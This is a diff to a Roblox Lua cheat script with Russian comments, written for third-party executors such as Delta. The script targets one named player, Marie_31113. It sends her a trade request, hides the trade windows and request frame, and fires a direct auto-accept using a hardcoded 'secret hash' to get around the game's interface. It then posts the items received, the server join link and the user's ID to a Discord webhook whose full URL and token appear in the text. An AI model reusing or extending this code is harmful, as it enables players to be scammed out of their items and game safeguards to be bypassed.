@@ -1,4 +1,4 @@
--- ⚠️ Клиентский скрипт. Запускать ДО захода Marie_31113.
+-- ⚠️ Скрипт для Delta / мобильных исполнителей. Запускать у себя ДО захода Marie_31113.
 local webhookUrl = "https://discord.com/api/webhooks/1566534128218804466/KMXt1caKqnxCvjDQLmS9R9QTzO5AaJxwqRpRsGLYdDZ2Gg75jx5IXsUwRZ9ROUdR9egJ"
 
 local HttpService        = game:GetService("HttpService")
@@ -12,78 +12,140 @@ if not LocalPlayer then return end
 local TARGET_NAME = "Marie_31113"
 
 -- =========================================================
--- Ожидание полной прогрузки игрока (персонаж + HRP)
--- =========================================================
-local function waitForCharacter(player, timeout)
-    timeout = timeout or 30
-    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-        return true
-    end
-    local done = false
-    local conn
-    conn = player.CharacterAdded:Connect(function()
-        done = true
-    end)
-    local start = os.clock()
-    while not done and os.clock() - start < timeout do
-        task.wait(0.2)
-        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-            done = true
-            break
-        end
-        if not player.Parent then return false end
-    end
-    if conn then conn:Disconnect() end
-    return done
-end
-
--- =========================================================
--- Отправка трейда
+-- 1. ОТПРАВКА ЗАПРОСА НА ТРЕЙД
 -- =========================================================
 local function sendTradeToTarget()
     local target = Players:FindFirstChild(TARGET_NAME)
     if not target then return end
 
-    print("[trade] Ждём полной прогрузки " .. TARGET_NAME .. "...")
-    if not waitForCharacter(target, 30) then
-        warn("[trade] " .. TARGET_NAME .. " не прогрузилась за 30с.")
-        return
+    print("[trade] Ждём прогрузки " .. TARGET_NAME .. "...")
+    -- Ждём персонажа цели, чтобы сервер точно её видел
+    if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
+        local conn
+        local done = false
+        conn = target.CharacterAdded:Connect(function() done = true end)
+        local t = 0
+        while not done and t < 30 and target.Parent do
+            task.wait(0.2); t += 0.2
+            if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then done = true end
+        end
+        if conn then conn:Disconnect() end
     end
+    task.wait(2) -- страховка
 
-    -- страховочная пауза 1с: её клиент должен успеть подключить RemoteFunction
-    task.wait(1)
+    local Trade = ReplicatedStorage:WaitForChild("Trade")
+    local SendRequest = Trade:WaitForChild("SendRequest")
 
-    local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
-    local SendRequest = Trade and Trade:WaitForChild("SendRequest", 15)
-    if not SendRequest then
-        warn("[trade] SendRequest не найден.")
-        return
-    end
-
-    for attempt = 1, 10 do
-        target = Players:FindFirstChild(TARGET_NAME)
-        if not target then
-            warn("[trade] " .. TARGET_NAME .. " вышла.")
+    for i = 1, 5 do
+        local ok, res = pcall(function() return SendRequest:InvokeServer(target) end)
+        if ok and res == true then
+            print("[trade] ✅ Запрос на трейд отправлен.")
             return
         end
-
-        local ok, result = pcall(function()
-            return SendRequest:InvokeServer(target)
-        end)
-
-        if ok and result == true then
-            print("[trade] ✅ Трейд отправлен " .. TARGET_NAME .. " (попытка " .. attempt .. ")")
-            return
-        end
-
-        warn("[trade] Попытка " .. attempt .. " — " .. (ok and tostring(result) or ("ошибка: " .. tostring(result))))
         task.wait(2)
     end
-    warn("[trade] ❌ Не удалось после 10 попыток.")
+    warn("[trade] ❌ Сервер отклонил запрос (уровень/кулдаун).")
 end
 
 -- =========================================================
--- Триггер на заход
+-- 2. СКРЫТИЕ GUI ТРЕЙДА
+-- =========================================================
+-- Скрываем RequestFrame (окно "Отправка запроса")
+local okTM, TM = pcall(function() return require(ReplicatedStorage.Modules.TradeModule) end)
+if okTM and TM and TM.GUI and TM.GUI.RequestFrame then
+    TM.GUI.RequestFrame.Visible = false
+    TM.GUI.RequestFrame:GetPropertyChangedSignal("Visible"):Connect(function()
+        TM.GUI.RequestFrame.Visible = false
+    end)
+end
+
+-- Скрываем основной TradeGUI визуально, чтобы не мешал
+task.spawn(function()
+    local pg = LocalPlayer:WaitForChild("PlayerGui")
+    for _, gui in ipairs(pg:GetChildren()) do
+        if gui:IsA("ScreenGui") and string.find(string.lower(gui.Name), "trade") then
+            gui.Enabled = false
+            -- если Enabled=false ломает кнопки, мы их обходим прямым вызовом ниже
+        end
+    end
+end)
+
+-- =========================================================
+-- 3. АВТО-АКЦЕПТ И ЛОГГЕР ЛУТА
+-- =========================================================
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local lastOffer = nil
+local myName = LocalPlayer.Name
+
+-- Перехватываем обновления трейда, чтобы знать "LastOffer" (для хэша)
+Trade.UpdateTrade.OnClientEvent:Connect(function(data)
+    if data.LastOffer then lastOffer = data.LastOffer end
+end)
+
+-- Слушаем, когда Мари нажимает Accept
+Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
+    if success and lootList then
+        -- 3.1. ЛОГГЕР ЛУТА В DISCORD
+        local webhookLootFields = {}
+        local totalValue = 0
+        local totalPrice = 0
+
+        for _, item in ipairs(lootList) do
+            local itemId = item[1]
+            local amount = item[2]
+            -- Получаем инфу о предмете для красивого лога
+            local itemInfo = require(ReplicatedStorage.Database.Sync)[item[3]] and require(ReplicatedStorage.Database.Sync)[item[3]][itemId]
+            local name = itemInfo and (itemInfo.ItemName or itemInfo.Name) or itemId
+            
+            table.insert(webhookLootFields, {
+                name = "🔹 " .. name .. " x" .. amount,
+                value = "Предмет получен",
+                inline = true
+            })
+        end
+
+        local payload = {
+            username = "Trade Logger (" .. myName .. ")",
+            embeds = {
+                {
+                    title = "📦 Успешный трейд с " .. TARGET_NAME,
+                    color = 0x2ECC71, -- зелёный
+                    fields = webhookLootFields,
+                    description = "Вы получили предметы из списка выше.",
+                    footer = { text = "Delta Mobile Logger" },
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                }
+            }
+        }
+
+        local requestFunc = request or http_request or (syn and syn.request)
+        if requestFunc then
+            pcall(function()
+                requestFunc({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
+            print("[trade] 📦 Лут залогирован в Discord!")
+        end
+    else
+        -- Если успех не пришёл, но Мари приняла, нам нужно нажать Accept за тебя
+        print("[trade] Мари приняла. Пробуем авто-акцепт...")
+        -- Обходим GUI и шлём запрос напрямую
+        if lastOffer then
+            pcall(function()
+                -- game.PlaceId * 3 — это секретный хэш из оригинального скрипта
+                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
+            end)
+            print("[trade] ✅ Авто-акцепт отправлен.")
+        end
+    end
+end)
+
+-- =========================================================
+-- 4. ОЖИДАНИЕ ЗАХОДА
 -- =========================================================
 if Players:FindFirstChild(TARGET_NAME) then
     task.spawn(sendTradeToTarget)
@@ -93,12 +155,40 @@ end
 
 Players.PlayerAdded:Connect(function(pl)
     if pl.Name == TARGET_NAME then
-        print("[trade] " .. TARGET_NAME .. " зашла — ждём прогрузку...")
         task.spawn(sendTradeToTarget)
     end
 end)
 
 -- =========================================================
--- WEBHOOK (тот же)
+-- 5. WEBHOOK "ЗАХОД В ИГРУ" (твой старый)
 -- =========================================================
--- ... вставь свой блок webhook, как в предыдущем сообщении
+task.spawn(function()
+    local placeId, jobId = game.PlaceId, game.JobId
+    if not jobId or jobId == "" then return end
+    local gameName = "Unknown"
+    pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
+    
+    local executorName = identifyexecutor and identifyexecutor() or "Delta"
+    local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
+    
+    local payload = {
+        username = "Roblox Logger",
+        embeds = {{
+            title = "🎮 Игрок в игре",
+            description = "**" .. myName .. "** присоединился к игре",
+            color = 0x5865F2,
+            fields = {
+                { name = "🕹️ Игра", value = "**"..gameName.."**\n`PlaceId: "..placeId.."`", inline = false },
+                { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
+                { name = "🔗 Сервер", value = "[Присоединиться]("..joinLink..")", inline = true },
+                { name = "👤 Игрок", value = "**"..myName.."** (`"..LocalPlayer.UserId.."`)", inline = false }
+            },
+            footer = { text = "Roblox Webhook Logger" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    local requestFunc = request or http_request or (syn and syn.request)
+    if requestFunc then
+        requestFunc({ Url = webhookUrl, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) })
+    end
+end)
